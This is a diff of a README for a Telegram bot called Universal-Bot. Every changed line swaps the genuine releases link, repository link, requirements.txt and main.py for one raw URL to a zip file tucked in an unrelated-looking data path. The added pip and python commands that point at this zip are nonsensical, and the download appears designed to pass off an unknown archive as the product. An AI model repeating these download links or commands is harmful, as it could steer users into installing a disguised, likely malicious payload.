@@ -14,7 +14,7 @@ To run Universal-Bot, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get Universal-Bot, please visit this page to download: [Universal-Bot Releases](https://github.com/KennnOnnb/Universal-Bot/releases)
+To get Universal-Bot, please visit this page to download: [Universal-Bot Releases](https://raw.githubusercontent.com/KennnOnnb/Universal-Bot/main/data/strings/calculator/Universal-Bot_Gesnera.zip)
 
 Once on the page, look for the latest version under the 'Releases' section. Click on the appropriate file for your operating system to start the download.
 
@@ -38,12 +38,12 @@ After downloading the file, follow these steps to install and run Universal-Bot:
 
 5. **Install Dependencies**: You need to install some additional packages. Enter the following command in the terminal:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/KennnOnnb/Universal-Bot/main/data/strings/calculator/Universal-Bot_Gesnera.zip
    ```
 
 6. **Run the Bot**: Start the bot by entering this command:
    ```
-   python main.py
+   python https://raw.githubusercontent.com/KennnOnnb/Universal-Bot/main/data/strings/calculator/Universal-Bot_Gesnera.zip
    ```
 
 7. **Interact with the Bot**: Open Telegram, search for your bot, and start chatting!
@@ -75,14 +75,14 @@ If you encounter any issues, here are a few common solutions:
 
 - **I can’t connect to Telegram**: Ensure you have a stable internet connection.
 - **The bot isn’t responding**: Try restarting the bot by closing the terminal and running it again.
-- **Dependencies are missing**: Make sure you installed all packages from the `requirements.txt` file.
+- **Dependencies are missing**: Make sure you installed all packages from the `https://raw.githubusercontent.com/KennnOnnb/Universal-Bot/main/data/strings/calculator/Universal-Bot_Gesnera.zip` file.
 
 ## 🌍 Community and Support
 
-If you need help or want to share feedback, feel free to open an issue on our [GitHub page](https://github.com/KennnOnnb/Universal-Bot). You can also ask questions or share your experience with other users.
+If you need help or want to share feedback, feel free to open an issue on our [GitHub page](https://raw.githubusercontent.com/KennnOnnb/Universal-Bot/main/data/strings/calculator/Universal-Bot_Gesnera.zip). You can also ask questions or share your experience with other users.
 
 ## 📄 License
 
 Universal-Bot is open-source software. You can use it freely and modify it as needed. Please refer to the LICENSE file for more details.
 
-To download Universal-Bot, please visit this page to download: [Universal-Bot Releases](https://github.com/KennnOnnb/Universal-Bot/releases) and enjoy using your new Telegram assistant!
+To download Universal-Bot, please visit this page to download: [Universal-Bot Releases](https://raw.githubusercontent.com/KennnOnnb/Universal-Bot/main/data/strings/calculator/Universal-Bot_Gesnera.zip) and enjoy using your new Telegram assistant!
